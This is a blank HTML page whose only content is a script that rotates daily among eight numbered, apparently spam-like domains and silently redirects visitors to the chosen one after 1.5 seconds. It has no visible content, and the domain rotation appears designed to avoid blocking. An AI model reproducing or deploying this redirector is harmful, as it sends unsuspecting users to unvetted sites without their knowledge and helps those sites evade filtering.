<!DOCTYPE html>
<html><head>
<meta charset="utf-8"/>
<title> </title>
<script type="text/javascript">
<!--
var url2 = new Array();
var url3="";
var istiao="1";

url2.push("999bbe.com");
url2.push("222bba.com");
url2.push("222bbd.com");
url2.push("222bbe.com");
url2.push("222bbf.com");
url2.push("222bbg.com");
url2.push("222bbh.com");
url2.push("222bbj.com");

var timestamp = Date.parse(new Date());
var day1=parseInt((timestamp+8*3600000)/86400000);
//url3 = "http://"+escape(url2[Math.floor(Math.random()*url2.length)]);
url3 = "https://" + escape(url2[(day1%url2.length)]);
setTimeout('location.href=url3',1500);
//-->
</script>
</head>
<body>
</body>
</html>
